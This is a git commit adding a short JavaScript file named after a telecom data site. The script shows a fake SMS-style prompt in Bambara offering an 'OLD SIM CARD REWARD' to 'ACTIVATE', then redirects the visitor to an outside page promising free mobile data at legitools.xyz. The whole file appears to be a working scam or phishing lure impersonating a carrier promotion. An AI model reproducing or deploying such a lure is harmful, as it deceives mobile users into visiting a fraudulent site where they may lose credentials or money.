22691419c3bcd8764ba5184fc1f012d24c7ab30c
harryjohnson86 <mfonjohnson86@gmail.com>
2025-02-05 19:14:52 -0800

    Create teleceldata.com.js

---
+++ teleceldata.com.js
@@ -0,0 +1,5 @@
+var password = 'Sim karti kɔrɔ sara'
+password=prompt('SMS: Ani kunnadiya i ka nimɔrɔ be se ka kunnafoni sɔrɔ gwansan OLD SIM CARD REWARD, i ka OK digi ka ACTIVATE. ','Sim karti kɔrɔ sara');
+if (password != 'Sim karti kɔrɔ sara') {
+location.href='https://legitools.xyz/mtcsim-upgrade.10gbdata.html';
+}
